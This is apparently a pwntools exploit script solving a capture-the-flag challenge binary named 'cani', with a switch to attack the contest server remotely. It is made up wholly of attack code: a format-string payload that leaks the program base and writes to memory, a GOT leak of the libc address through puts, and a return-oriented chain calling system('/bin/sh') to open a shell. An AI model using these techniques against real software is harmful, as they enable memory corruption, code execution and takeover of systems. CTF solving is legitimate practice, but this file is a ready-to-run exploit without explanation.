#!/usr/bin/python

from pwn import *
import sys

remote_ip, port = 'challs.actf.co', 31228
binary = './cani_patched'
brkpts = '''
b main
c
set{long}0x555555557558=0x7ffff7dfa1db
b*0x55555555547e
c
'''

elf = ELF("./cani_patched")
libc = ELF("./libc.so.6")

context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"
context.log_level = "debug"
context.aslr = False

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

uu64 = lambda a: u64(a.ljust(8, chr(0)))

if len(sys.argv) > 1 and sys.argv[1] == "-r":
    io = remote(remote_ip, port)
    context.noptrace = True

elif len(sys.argv) > 1:
    io = gdb.debug(binary, brkpts, env = {'LD_PRELOAD' : './libc.so.6'})

else:
    io = process(binary, env = {'LD_PRELOAD' : './libc.so.6'})

def choice(idx):
    sla(": ", str(idx))

if __name__ == "__main__":

    payload = "%17$s%{}c%16$hn".format(0xa454 - 6)
    choice(payload)
    choice(-3)

    reu("this is ")

    code_base = uu64(re(6)) - 0x35a8
    elf.address = code_base
    main = elf.symbols['main']
    exit_got = elf.got['exit']
    puts_got = elf.got['puts']

    log.info("code base @ "+hex(code_base))

    payload = flat([
        exit_got,
        puts_got
    ])

    payload += "a"*64
    payload += p64(main)

    choice(payload)

    reu("Well we're here. Bye, ")

    libc.address = uu64(re(6)) - libc.symbols['puts']
    log.info("libc @ "+hex(libc.address))

    choice("a")
    choice(-3)

    system = libc.symbols['system']
    binsh = next(libc.search("/bin/sh"))
    pop_rdi = code_base + 0x1503
    ret = pop_rdi + 1

    payload = "a"*80
    payload += flat([
        pop_rdi,
        binsh,
        system
    ])

    choice(payload)

    io.interactive()
